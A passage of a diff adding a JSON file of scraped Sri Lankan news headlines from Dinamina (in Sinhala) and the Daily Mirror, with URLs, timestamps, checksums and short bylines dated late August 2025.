+        "url": "https://www.dinamina.lk/2025/08/29/local/217337/%e0%b6%af%e0%b6%a9%e0%b6%ba-%e0%b6%9c%e0%b7%99%e0%b7%80%e0%b6%b1%e0%b7%8a%e0%b6%b1-%e0%b6%b6%e0%b7%90%e0%b6%bb%e0%b7%92%e0%b7%80-%e0%b7%84%e0%b7%92%e0%b6%bb%e0%b7%9a-%e0%b6%9c%e0%b7%92%e0%b6%ba/",
+        "timestamp": "2025-08-29T01:00:57+05:30",
+        "checkSum": "7b8075da9bad447b9b34c980e761be28b068460047dd36309e4ccdb0d56d755f",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:57+05:30"
+      },
+      {
+        "title": "CBA 55 වසරක විශිෂ්ටත්වය සමරයි",
+        "url": "https://www.dinamina.lk/2025/08/29/business/217485/cba-55-%e0%b7%80%e0%b7%83%e0%b6%bb%e0%b6%9a-%e0%b7%80%e0%b7%92%e0%b7%81%e0%b7%92%e0%b7%82%e0%b7%8a%e0%b6%a7%e0%b6%ad%e0%b7%8a%e0%b7%80%e0%b6%ba-%e0%b7%83%e0%b6%b8%e0%b6%bb%e0%b6%ba%e0%b7%92-2/",
+        "timestamp": "2025-08-29T01:00:57+05:30",
+        "checkSum": "5197c63cedbf7802806e337a9d249e5b1d51088abdb24fd42304ce0459f1f4d5",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:57+05:30"
+      },
+      {
+        "title": "Dialog MAS Enabler 2025 වැඩසටහන සාර්ථකව",
+        "url": "https://www.dinamina.lk/2025/08/29/business/217469/dialog-mas-enabler-2025-%e0%b7%80%e0%b7%90%e0%b6%a9%e0%b7%83%e0%b6%a7%e0%b7%84%e0%b6%b1-%e0%b7%83%e0%b7%8f%e0%b6%bb%e0%b7%8a%e0%b6%ae%e0%b6%9a%e0%b7%80/",
+        "timestamp": "2025-08-29T01:00:56+05:30",
+        "checkSum": "c276cfff86b4cd872e594b086f95e34998b655e07fae7728bf9d91b56503e8dd",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:56+05:30"
+      },
+      {
+        "title": "නිදහස් අරගලයේ ජන සංහාරය පිළිගන්නැයි බංග්ලාදේශ විදේශ ඇමැති පාකිස්තානයෙන් ඉල්ලයි",
+        "url": "https://www.dinamina.lk/2025/08/29/foreign/217503/%e0%b6%b1%e0%b7%92%e0%b6%af%e0%b7%84%e0%b7%83%e0%b7%8a-%e0%b6%85%e0%b6%bb%e0%b6%9c%e0%b6%bd%e0%b6%ba%e0%b7%9a-%e0%b6%a2%e0%b6%b1-%e0%b7%83%e0%b6%82%e0%b7%84%e0%b7%8f%e0%b6%bb%e0%b6%ba-%e0%b6%b4/",
+        "timestamp": "2025-08-29T01:00:56+05:30",
+        "checkSum": "87c7772beec03ed73436686160636a768a0dcb36f70805902edc906cceb18951",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:56+05:30"
+      },
+      {
+        "title": "අනුරපුර නිදන් සිද්ධියේ සැකකාර පොලිස් බිරිය යළි රිමාන්ඩ්",
+        "url": "https://www.dinamina.lk/2025/08/29/local/217553/%e0%b6%85%e0%b6%b1%e0%b7%94%e0%b6%bb%e0%b6%b4%e0%b7%94%e0%b6%bb-%e0%b6%b1%e0%b7%92%e0%b6%af%e0%b6%b1%e0%b7%8a-%e0%b7%83%e0%b7%92%e0%b6%af%e0%b7%8a%e0%b6%b0%e0%b7%92%e0%b6%ba%e0%b7%9a-%e0%b7%83/",
+        "timestamp": "2025-08-29T01:00:56+05:30",
+        "checkSum": "cccf73987092561fd9b3f1366bdf13c446319dd5658c80a5bc6353d6f93f7e4b",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:56+05:30"
+      },
+      {
+        "title": "Black coral විකිණීමට ප්‍රදර්ශනය කළ අයෙක් අත්අඩංගුවට",
+        "url": "https://www.dinamina.lk/2025/08/29/provincial-news/217399/black-coral-%e0%b7%80%e0%b7%92%e0%b6%9a%e0%b7%92%e0%b6%ab%e0%b7%93%e0%b6%b8%e0%b6%a7-%e0%b6%b4%e0%b7%8a%e0%b6%bb%e0%b6%af%e0%b6%bb%e0%b7%8a%e0%b7%81%e0%b6%b1%e0%b6%ba-%e0%b6%9a%e0%b7%85/",
+        "timestamp": "2025-08-29T01:00:55+05:30",
+        "checkSum": "78d598ee61ef2c014a51ecd12dfc4d3e559638e3fcad926484545b4d75453302",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:55+05:30"
+      },
+      {
+        "title": "පන්ජාබ් ප්‍රාන්තය ගංවතුරෙන් යටවෙයි",
+        "url": "https://www.dinamina.lk/2025/08/29/foreign/217518/%e0%b6%b4%e0%b6%b1%e0%b7%8a%e0%b6%a2%e0%b7%8f%e0%b6%b6%e0%b7%8a-%e0%b6%b4%e0%b7%8a%e0%b6%bb%e0%b7%8f%e0%b6%b1%e0%b7%8a%e0%b6%ad%e0%b6%ba-%e0%b6%9c%e0%b6%82%e0%b7%80%e0%b6%ad%e0%b7%94%e0%b6%bb/",
+        "timestamp": "2025-08-29T01:00:55+05:30",
+        "checkSum": "54945a60ac6598b1bd52abc611c89cb6a71baa48477708cef292be39404b86f3",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:55+05:30"
+      },
+      {
+        "title": "සංවිධානාත්මක අපරාධකරුවන්ට එරෙහිව විශේෂ අධිකරණයක් පිහිටුවනවා",
+        "url": "https://www.dinamina.lk/2025/08/29/local/217531/%e0%b7%83%e0%b6%82%e0%b7%80%e0%b7%92%e0%b6%b0%e0%b7%8f%e0%b6%b1%e0%b7%8f%e0%b6%ad%e0%b7%8a%e0%b6%b8%e0%b6%9a-%e0%b6%85%e0%b6%b4%e0%b6%bb%e0%b7%8f%e0%b6%b0%e0%b6%9a%e0%b6%bb%e0%b7%94%e0%b7%80-2/",
+        "timestamp": "2025-08-29T01:00:54+05:30",
+        "checkSum": "1f754cdabcc2beb1e4dc6129165afddc50d1778ec975e7abe547ec1ee16593a4",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:54+05:30"
+      },
+      {
+        "title": "කොමර්ෂල් බැංකුව යාපනය විශ්වවිද්‍යාලය සමඟ ගොවීන් සහ තරුණයින් සවිබල ගන්වයි",
+        "url": "https://www.dinamina.lk/2025/08/29/business/217473/%e0%b6%9a%e0%b7%9c%e0%b6%b8%e0%b6%bb%e0%b7%8a%e0%b7%82%e0%b6%bd%e0%b7%8a-%e0%b6%b6%e0%b7%90%e0%b6%82%e0%b6%9a%e0%b7%94%e0%b7%80-%e0%b6%ba%e0%b7%8f%e0%b6%b4%e0%b6%b1%e0%b6%ba-%e0%b7%80%e0%b7%92/",
+        "timestamp": "2025-08-29T01:00:54+05:30",
+        "checkSum": "162cccc03029d5cb79befd26a94aa2175583d7a5cea317e0c50809f9fa6915c7",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:54+05:30"
+      },
+      {
+        "title": "ඌවට-දකුණට දැඩි නියඟයක් වන සතුන්ගේ පිපාසාව සංසිඳවීමට කිරිවෙහෙර විහාරාධිපති කැප වෙති",
+        "url": "https://www.dinamina.lk/2025/08/29/provincial-news/217391/%e0%b6%8c%e0%b7%80%e0%b6%a7-%e0%b6%af%e0%b6%9a%e0%b7%94%e0%b6%ab%e0%b6%a7-%e0%b6%af%e0%b7%90%e0%b6%a9%e0%b7%92-%e0%b6%b1%e0%b7%92%e0%b6%ba%e0%b6%9f%e0%b6%ba%e0%b6%9a%e0%b7%8a-%e0%b7%80%e0%b6%b1/",
+        "timestamp": "2025-08-29T01:00:54+05:30",
+        "checkSum": "8ffd8ea1357448882b7c35dbc7a4084a9000dd5384835fd50998b2c3f0a16ade",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:54+05:30"
+      },
+      {
+        "title": "AIA Pension Calculator මූල්‍ය සාක්ෂරතාවට දියුණු කෙරේ",
+        "url": "https://www.dinamina.lk/2025/08/29/business/217465/aia-pension-calculator-%e0%b6%b8%e0%b7%96%e0%b6%bd%e0%b7%8a%e0%b6%ba-%e0%b7%83%e0%b7%8f%e0%b6%9a%e0%b7%8a%e0%b7%82%e0%b6%bb%e0%b6%ad%e0%b7%8f%e0%b7%80%e0%b6%a7-%e0%b6%af%e0%b7%92/",
+        "timestamp": "2025-08-29T01:00:53+05:30",
+        "checkSum": "0ad354bc7cac497d6e041710f5489b9957fb927161f8a51cc8244182f8e343d6",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:53+05:30"
+      },
+      {
+        "title": "තුවාල ලැබූ දරුවන්ගේ සුව දුක් විමසීමට නි. ඇමැතිවරු දෙදෙනෙක් යති",
+        "url": "https://www.dinamina.lk/2025/08/29/local/217560/%e0%b6%ad%e0%b7%94%e0%b7%80%e0%b7%8f%e0%b6%bd-%e0%b6%bd%e0%b7%90%e0%b6%b6%e0%b7%96-%e0%b6%af%e0%b6%bb%e0%b7%94%e0%b7%80%e0%b6%b1%e0%b7%8a%e0%b6%9c%e0%b7%9a-%e0%b7%83%e0%b7%94%e0%b7%80-%e0%b6%af/",
+        "timestamp": "2025-08-29T01:00:52+05:30",
+        "checkSum": "b79016186b142ef3935cb4b2d2d41dc419289e188cc8a7e81853b96d68eef83f",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:52+05:30"
+      },
+      {
+        "title": "අපනයන ක්ෂේත්‍රය අබිමුව ඇති අභියෝග",
+        "url": "https://www.dinamina.lk/2025/08/29/business/217471/%e0%b6%85%e0%b6%b4%e0%b6%b1%e0%b6%ba%e0%b6%b1-%e0%b6%9a%e0%b7%8a%e0%b7%82%e0%b7%9a%e0%b6%ad%e0%b7%8a%e0%b6%bb%e0%b6%ba-%e0%b6%85%e0%b6%b6%e0%b7%92%e0%b6%b8%e0%b7%94%e0%b7%80-%e0%b6%87/",
+        "timestamp": "2025-08-29T01:00:52+05:30",
+        "checkSum": "bb941d9eb6a7ab24e255be92b53fca3039e3e68b8db6411d3e8dca552938cc43",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:52+05:30"
+      },
+      {
+        "title": "මින්නේරිය කටුකැලියාව වැවේ ප්‍රතිසංස්කරණ අරඹයි",
+        "url": "https://www.dinamina.lk/2025/08/29/local/217341/%e0%b6%b8%e0%b7%92%e0%b6%b1%e0%b7%8a%e0%b6%b1%e0%b7%9a%e0%b6%bb%e0%b7%92%e0%b6%ba-%e0%b6%9a%e0%b6%a7%e0%b7%94%e0%b6%9a%e0%b7%90%e0%b6%bd%e0%b7%92%e0%b6%ba%e0%b7%8f%e0%b7%80-%e0%b7%80%e0%b7%90%e0%b7%80/",
+        "timestamp": "2025-08-29T01:00:51+05:30",
+        "checkSum": "fa84009214914702c09fb5a40b3b04dbd7119468e1857ff660709de5e231a37d",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:51+05:30"
+      },
+      {
+        "title": "Grand Leisure Care and Wellness Resort මීගමුවේදී විවෘත වේ",
+        "url": "https://www.dinamina.lk/2025/08/29/business/217487/grand-leisure-care-and-wellness-resort-%e0%b6%b8%e0%b7%93%e0%b6%9c%e0%b6%b8%e0%b7%94%e0%b7%80%e0%b7%9a%e0%b6%af%e0%b7%93-%e0%b7%80%e0%b7%92%e0%b7%80%e0%b7%98%e0%b6%ad-%e0%b7%80%e0%b7%9a/",
+        "timestamp": "2025-08-29T01:00:48+05:30",
+        "checkSum": "e943af949953627aeca75abb5ba7da3b089b6111062001a2a7913586e2364cd0",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:48+05:30"
+      },
+      {
+        "title": "සෑම කාන්තාවකටම සහ ගැහැනු දරුවකුටම ආරක්ෂිතව ජීවත් විය හැකි වටපිටාවක් අපි හදමු",
+        "url": "https://www.dinamina.lk/2025/08/29/local/217526/%e0%b7%83%e0%b7%91%e0%b6%b8-%e0%b6%9a%e0%b7%8f%e0%b6%b1%e0%b7%8a%e0%b6%ad%e0%b7%8f%e0%b7%80%e0%b6%9a%e0%b6%a7%e0%b6%b8-%e0%b7%83%e0%b7%84-%e0%b6%9c%e0%b7%90%e0%b7%84%e0%b7%90%e0%b6%b1%e0%b7%94/",
+        "timestamp": "2025-08-29T01:00:47+05:30",
+        "checkSum": "b3a6ba0e655c64cf8124d6d5bb6cff9967e22b95b0f394b20f35640cff707ef9",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:47+05:30"
+      },
+      {
+        "title": "රාගම පුනරුත්ථාපන රෝහලේ රෝගී සත්කාරක සේවා වැඩිදියුණුවට තාක්ෂණික සහාය",
+        "url": "https://www.dinamina.lk/2025/08/29/local/217499/%e0%b6%bb%e0%b7%8f%e0%b6%9c%e0%b6%b8-%e0%b6%b4%e0%b7%94%e0%b6%b1%e0%b6%bb%e0%b7%94%e0%b6%ad%e0%b7%8a%e0%b6%ae%e0%b7%8f%e0%b6%b4%e0%b6%b1-%e0%b6%bb%e0%b7%9d%e0%b7%84%e0%b6%bd%e0%b7%9a-%e0%b6%bb/",
+        "timestamp": "2025-08-29T01:00:47+05:30",
+        "checkSum": "190e4e6c1206ac039227c3131ab65213ffcaba175197e3924bf9303da890caeb",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:47+05:30"
+      },
+      {
+        "title": "සුහුරු වාරි ව්‍යාපෘතියෙන් ගොවිපොළ යෙදවුම් කට්ටල ගැන විධිමත් පරීක්ෂණයක්",
+        "url": "https://www.dinamina.lk/2025/08/29/local/217493/%e0%b7%83%e0%b7%94%e0%b7%84%e0%b7%94%e0%b6%bb%e0%b7%94-%e0%b7%80%e0%b7%8f%e0%b6%bb%e0%b7%92-%e0%b7%80%e0%b7%8a%e0%b6%ba%e0%b7%8f%e0%b6%b4%e0%b7%98%e0%b6%ad%e0%b7%92%e0%b6%ba%e0%b7%99%e0%b6%b1/",
+        "timestamp": "2025-08-29T01:00:46+05:30",
+        "checkSum": "60422b7d8f455cdca3e51ce7ee8ec825a6efaa5154ff2686a8ce3876b41a71ad",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:46+05:30"
+      },
+      {
+        "title": "ශ්‍රී ලංකා-කොදෙව් යොවුන් එක්දින තරගාවලිය හෙට ඇරඹේ",
+        "url": "https://www.dinamina.lk/2025/08/29/sports/217438/%e0%b7%81%e0%b7%8a%e0%b6%bb%e0%b7%93-%e0%b6%bd%e0%b6%82%e0%b6%9a%e0%b7%8f-%e0%b6%9a%e0%b7%9c%e0%b6%af%e0%b7%99%e0%b7%80%e0%b7%8a-%e0%b6%ba%e0%b7%9c%e0%b7%80%e0%b7%94%e0%b6%b1%e0%b7%8a/",
+        "timestamp": "2025-08-29T01:00:44+05:30",
+        "checkSum": "295c8585d867402907e3ee44e85038e24a34f435f9ea427d8986b3fc17eec335",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:44+05:30"
+      },
+      {
+        "title": "හබරාදූව ජාතික ඉතිරි කිරීමේ බැංකුව නව දෙමහල් ගොඩනැඟිල්ලකට",
+        "url": "https://www.dinamina.lk/2025/08/29/business/217446/%e0%b7%84%e0%b6%b6%e0%b6%bb%e0%b7%8f%e0%b6%af%e0%b7%96%e0%b7%80-%e0%b6%a2%e0%b7%8f%e0%b6%ad%e0%b7%92%e0%b6%9a-%e0%b6%89%e0%b6%ad%e0%b7%92%e0%b6%bb%e0%b7%92-%e0%b6%9a%e0%b7%92%e0%b6%bb%e0%b7%93/",
+        "timestamp": "2025-08-29T01:00:42+05:30",
+        "checkSum": "e6d1c6a5cd577cf10007a1a3e236ec5ce520c2c517beaa54eef4163241d643cf",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:42+05:30"
+      },
+      {
+        "title": "සුනඛයකු පොළොවේ ගසා නානුඔය ඇළට විසි කළැයි තරුණයාට එරෙහිව පැමිණිල්ලක්",
+        "url": "https://www.dinamina.lk/2025/08/29/local/217536/%e0%b7%83%e0%b7%94%e0%b6%b1%e0%b6%9b%e0%b6%ba%e0%b6%9a%e0%b7%94-%e0%b6%b4%e0%b7%9c%e0%b7%85%e0%b7%9c%e0%b7%80%e0%b7%9a-%e0%b6%9c%e0%b7%83%e0%b7%8f-%e0%b6%b1%e0%b7%8f%e0%b6%b1%e0%b7%94%e0%b6%94/",
+        "timestamp": "2025-08-29T01:00:40+05:30",
+        "checkSum": "d1685834f0d66db9e6c632d55a05c400141ebc4bbcad7bc1cc9ab91cac02b274",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:40+05:30"
+      },
+      {
+        "title": "මිනසෝටා ප්‍රාන්තයේ පාසලක වෙඩි තැබීමක්",
+        "url": "https://www.dinamina.lk/2025/08/29/foreign/217520/%e0%b6%b8%e0%b7%92%e0%b6%b1%e0%b7%83%e0%b7%9d%e0%b6%a7%e0%b7%8f-%e0%b6%b4%e0%b7%8a%e0%b6%bb%e0%b7%8f%e0%b6%b1%e0%b7%8a%e0%b6%ad%e0%b6%ba%e0%b7%9a-%e0%b6%b4%e0%b7%8f%e0%b7%83%e0%b6%bd%e0%b6%9a/",
+        "timestamp": "2025-08-29T01:00:39+05:30",
+        "checkSum": "1137ba01e4177ff3f2fdb5402a1ba5994e853048a3e39aa5b304af3b1340c331",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:39+05:30"
+      },
+      {
+        "title": "JB Lands දේපළ සංවර්ධන කර්මාන්තය වසර 45ක් සමරයි",
+        "url": "https://www.dinamina.lk/2025/08/29/business/217459/jb-lands-%e0%b6%af%e0%b7%9a%e0%b6%b4%e0%b7%85-%e0%b7%83%e0%b6%82%e0%b7%80%e0%b6%bb%e0%b7%8a%e0%b6%b0%e0%b6%b1-%e0%b6%9a%e0%b6%bb%e0%b7%8a%e0%b6%b8%e0%b7%8f%e0%b6%b1%e0%b7%8a%e0%b6%ad%e0%b6%ba/",
+        "timestamp": "2025-08-29T01:00:39+05:30",
+        "checkSum": "ae5e7b483dc2423e2b1cfdb920678b740951cc9ccb164bda8ee12c9b4cb9ec56",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:39+05:30"
+      },
+      {
+        "title": "15න් පහළ දෙවැනි කොටසේ ක්‍රිකට් ඇඹිලිපිටිය ජනාධිපති-කොළඹ රාජකීය අවසන් තරගය අද බණ්ඩාරගමදී",
+        "url": "https://www.dinamina.lk/2025/08/29/sports/217436/15%e0%b6%b1%e0%b7%8a-%e0%b6%b4%e0%b7%84%e0%b7%85-%e0%b6%af%e0%b7%99%e0%b7%80%e0%b7%90%e0%b6%b1%e0%b7%92-%e0%b6%9a%e0%b7%9c%e0%b6%a7%e0%b7%83%e0%b7%9a-%e0%b6%9a%e0%b7%8a%e0%b6%bb%e0%b7%92-2/",
+        "timestamp": "2025-08-29T01:00:39+05:30",
+        "checkSum": "41e04966878fad809c1f30b4456b73cbe8c8acc268adfe606dfc2da4f5e66dc8",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:39+05:30"
+      },
+      {
+        "title": "බණ්ඩාරවෙල අමිතානන්ද නාහිමිගේ තෙමස් පූර්ණ පින්කම අනිද්දා",
+        "url": "https://www.dinamina.lk/2025/08/29/local/217332/%e0%b6%b6%e0%b6%ab%e0%b7%8a%e0%b6%a9%e0%b7%8f%e0%b6%bb%e0%b7%80%e0%b7%99%e0%b6%bd-%e0%b6%85%e0%b6%b8%e0%b7%92%e0%b6%ad%e0%b7%8f%e0%b6%b1%e0%b6%b1%e0%b7%8a%e0%b6%af-%e0%b6%b1%e0%b7%8f%e0%b7%84%e0%b7%92/",
+        "timestamp": "2025-08-29T01:00:38+05:30",
+        "checkSum": "8d8b9ca98c2d87ab63d32fc034d2e03288f9c7cb58aa9b5951330d4f8e427e02",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:38+05:30"
+      },
+      {
+        "title": "ඇඟේ හැප්පෙන ටෙලිනාට්‍ය කලාවට නවමු හැඩයක් The Lake",
+        "url": "https://www.dinamina.lk/2025/08/29/featured/217360/%e0%b6%87%e0%b6%9f%e0%b7%9a-%e0%b7%84%e0%b7%90%e0%b6%b4%e0%b7%8a%e0%b6%b4%e0%b7%99%e0%b6%b1-%e0%b6%a7%e0%b7%99%e0%b6%bd%e0%b7%92%e0%b6%b1%e0%b7%8f%e0%b6%a7%e0%b7%8a%e0%b6%ba-%e0%b6%9a/",
+        "timestamp": "2025-08-29T01:00:37+05:30",
+        "checkSum": "77353d7be2076a2fc7acd462722cfaf4769d4e731dde2fa7fcd1c09f26b0757f",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:37+05:30"
+      },
+      {
+        "title": "නවකවද සිද්ධියකට කැලණියේ 4ක් අත්අඩංගුවට",
+        "url": "https://www.dinamina.lk/2025/08/29/local/217563/%e0%b6%b1%e0%b7%80%e0%b6%9a%e0%b7%80%e0%b6%af-%e0%b7%83%e0%b7%92%e0%b6%af%e0%b7%8a%e0%b6%b0%e0%b7%92%e0%b6%ba%e0%b6%9a%e0%b6%a7-%e0%b6%9a%e0%b7%90%e0%b6%bd%e0%b6%ab%e0%b7%92%e0%b6%ba%e0%b7%9a-4/",
+        "timestamp": "2025-08-29T01:00:36+05:30",
+        "checkSum": "451bc5e8a9a8cac19505b82318a7cc13737bd16be866a3ca8fca5fdf7a76d3a9",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:36+05:30"
+      }
+    ]
+  },
+  "dailymirror": {
+    "success": true,
+    "data": [
+      {
+        "title": "Tourist pouring beer down elephant’s trunk in Kenya sparks anger",
+        "url": "https://www.dailymirror.lk/breaking-news/Tourist-pouring-beer-down-elephants-trunk-in-Kenya-sparks-anger/108-317909",
+        "byline": "Several investigations have been launched after a Spanish man in Kenya posted videos of himself pouring beer down an elephant’s trunk - sparking anger on social media.",
+        "timestamp": "5 hours ago",
+        "isoTimestamp": "2025-08-29T02:32:50+05:30",
+        "baseUrl": "https://www.dailymirror.lk",
+        "checkSum": "83d43e1756e619925df8e6ea480830c35d4308e3de9299fae6257715af5b3174"
+      },
+      {
+        "title": "Eight-day marine weather forecast issued for coastal areas",
+        "url": "https://www.dailymirror.lk/breaking-news/Eight-day-marine-weather-forecast-issued-for-coastal-areas/108-317908",
+        "byline": "The Marine Weather Division of the Meteorology Department today issued an eight-day forecast for coastal areas around the country.",
+        "timestamp": "5 hours ago",
+        "isoTimestamp": "2025-08-29T02:32:50+05:30",
+        "baseUrl": "https://www.dailymirror.lk",
+        "checkSum": "2c639dd609244aef65d5420fd1545f8b2ee035debbf7107f0fae834fa6b0aa54"
+      },
+      {
+        "title": "Two arrested for killing deer in Nanu Oya",
+        "url": "https://www.dailymirror.lk/breaking-news/Two-arrested-for-killing-deer-in-Nanu-Oya/108-317907",
+        "byline": "Two individuals were arrested yesterday in connection with the killing of a deer in the Nanu Oya area of Nuwara Eliya, the Wildlife Department said.",
+        "timestamp": "5 hours ago",
+        "isoTimestamp": "2025-08-29T02:32:50+05:30",
+        "baseUrl": "https://www.dailymirror.lk",
+        "checkSum": "f93221080d2af22bbb4ec8914c19d57ae3565829618224a454b66d97a0b85c23"
+      },
+      {
+        "title": "Public warned over fake banking websites",
+        "url": "https://www.dailymirror.lk/breaking-news/Public-warned-over-fake-banking-websites/108-317906",
+        "byline": "Local banks have urged customers to remain vigilant as scammers circulate fraudulent links via emails and text messages, directing users to fake banking websites designed to steal personal and financial information.",
+        "timestamp": "5 hours ago",
+        "isoTimestamp": "2025-08-29T02:32:50+05:30",
+        "baseUrl": "https://www.dailymirror.lk",
+        "checkSum": "a75b726a50621b56f76d08d701228332c468dc798e021a53a1300f1675fbc891"
+      },
+      {
+        "title": "108 couples married at one ceremony",
+        "url": "https://www.dailymirror.lk/breaking-news/108-couples-married-at-one-ceremony/108-317905",
+        "byline": "A group of 108 young couples in Jaffna entered into the happy union of marriage at a mass wedding ceremony yesterday at the Selva Sannithi Murugan Temple in Jaffna.",
+        "timestamp": "6 hours ago",
+        "isoTimestamp": "2025-08-29T02:31:50+05:30",
+        "baseUrl": "https://www.dailymirror.lk",
+        "checkSum": "22437fc9aff68b3345491f60435caecd7d6328e42be375637eaff275ae68ed6b"
+      },
+      {
+        "title": "Former Urban Councillor remanded till Sept 8 over attack on policeman",
+        "url": "https://www.dailymirror.lk/breaking-news/Former-Urban-Councillor-remanded-till-Sept-8-over-attack-on-policeman/108-317904",
+        "byline": "A former Urban Councillor, who was arrested by the Colombo Crimes Division (CCD) in connection with an attack on a police officer near the Fort Magistrate’s Court, was today ordered to be remanded until September 8.",
+        "timestamp": "7 hours ago",
+        "isoTimestamp": "2025-08-29T02:30:50+05:30",
+        "baseUrl": "https://www.dailymirror.lk",
+        "checkSum": "4ae7139fe3fc7ad66997af848f5ae660b13c38f1434e5167c66f969f40c88333"
+      },
+      {
+        "title": "Sri Lanka names squad for Asia Cup",
+        "url": "https://www.dailymirror.lk/breaking-news/Sri-Lanka-names-squad-for-Asia-Cup/108-317902",
+        "byline": "The Sri Lanka Cricket Selection Panel has announced the 16-member national squad for the upcoming ACC Men’s T20 Asia Cup 2025, which will be played in the United Arab Emirates from September 9 to 28.",
+        "timestamp": "8 hours ago",
+        "isoTimestamp": "2025-08-29T02:29:50+05:30",
+        "baseUrl": "https://www.dailymirror.lk",
+        "checkSum": "09b172a125a9a7e0fe7ef90bfcff2aaa7c024c1e6dc2c01ef6d17b013541d1f0"
+      },
+      {
+        "title": "Ven Narampanawe Ananda Thera elected as Anunayake of Asgiri Chapter",
+        "url": "https://www.dailymirror.lk/breaking-news/Ven-Narampanawe-Ananda-Thera-elected-as-Anunayake-of-Asgiri-Chapter/108-317901",
+        "byline": "The Deputy Registrar of the Asgiri Chapter, Most Venerable Narampanawe Ananda Thera, was today (28) elected as the Anunayake of the Asgiri Chapter of the Siyam Maha Nikaya.",
+        "timestamp": "8 hours ago",
+        "isoTimestamp": "2025-08-29T02:29:50+05:30",
+        "baseUrl": "https://www.dailymirror.lk",
+        "checkSum": "f1574a23f5fbd69e0c9623d781c49e8e0f7e6ed86f0d042d422ffca693276813"
+      },
+      {
+        "title": "Approval must for UNPers to participate in  media talk shows",
+        "url": "https://www.dailymirror.lk/breaking-news/Approval-must-for-UNPers-to-participate-in-media-talk-shows/108-317900",
+        "byline": "UNPers will not be allowed to participate in media talk shows without the approval of party General Secretary Thalatha Athukorala, an official statement said today.",
+        "timestamp": "8 hours ago",
+        "isoTimestamp": "2025-08-29T02:29:50+05:30",
+        "baseUrl": "https://www.dailymirror.lk",
+        "checkSum": "062e2d629920284ef29b2d4bf231c32284c9b3e6ac5283f2341ea12232c08e9b"
+      },
+      {
+        "title": "Probe underway to identify organisers of Ranil protest: IGP",
+        "url": "https://www.dailymirror.lk/breaking-news/Probe-underway-to-identify-organisers-of-Ranil-protest-IGP/108-317899",
+        "byline": "The Inspector General of Police (IGP) said today that investigations are underway to identify individuals who organised the protest outside the Colombo Fort Magistrate’s Court when former President Ranil Wickremesinghe’s case was taken up.",
+        "timestamp": "8 hours ago",
+        "isoTimestamp": "2025-08-29T02:29:50+05:30",
+        "baseUrl": "https://www.dailymirror.lk",
+        "checkSum": "d21e3ef787b8838cc658cc1a143fc387b317538d1db7a077e4b1150ee16885b1"
+      },
+      {
+        "title": "Daily Mirror Brief: Daily News Recap, Top Headlines & Must-Read Stories - 28th August",
+        "url": "https://www.dailymirror.lk/breaking-news/Daily-Mirror-Brief-Daily-News-Recap-Top-Headlines-Must-Read-Stories-28th-August/108-317898",
+        "byline": "Daily Mirror Brief is your daily news digest—bringing you the top headlines, key updates, and essential stories you may have missed across politics, tech, culture, and global affairs. Quick, clear, and curated—your trusted news recap, whenever you’re ready.",
+        "timestamp": "9 hours ago",
+        "isoTimestamp": "2025-08-29T02:28:50+05:30",
+        "baseUrl": "https://www.dailymirror.lk",
+        "checkSum": "6faef323d3dd4116e88f80c4d7d0ccedb894ffdc94848e77595eb9f5c885b49c"
+      },
+      {
+        "title": "Sun directly over Sri Lanka for 10 days",
+        "url": "https://www.dailymirror.lk/breaking-news/Sun-directly-over-Sri-Lanka-for-10-days/108-317897",
+        "byline": "The sun is expected to be directly over Sri Lanka from today (28) to September 7, as a result of its apparent southward relative motion, the Forecasting Division of the National Meteorological Centre said.",
+        "timestamp": "28 Aug 2025",
+        "isoTimestamp": "2025-08-29T02:37:50+05:30",
+        "baseUrl": "https://www.dailymirror.lk",
+        "checkSum": "4a47aa68d7a78256c95651096114fb4952f1ab0882740e8a0a5238ec624b9761"
+      },
+      {
+        "title": "Misled by Google Maps, 3 men die after driving their car off incomplete bridge in India",
+        "url": "https://www.dailymirror.lk/breaking-news/Misled-by-Google-Maps-3-men-die-after-driving-their-car-off-incomplete-bridge-in-India/108-317896",
+        "byline": "Three men were killed after their car drove off an incomplete bridge and plunged on a riverbed while they were using Google Maps to navigate in Uttar Pradesh, India, in the early hours of Nov 24.",
+        "timestamp": "28 Aug 2025",
+        "isoTimestamp": "2025-08-29T02:37:50+05:30",
+        "baseUrl": "https://www.dailymirror.lk",
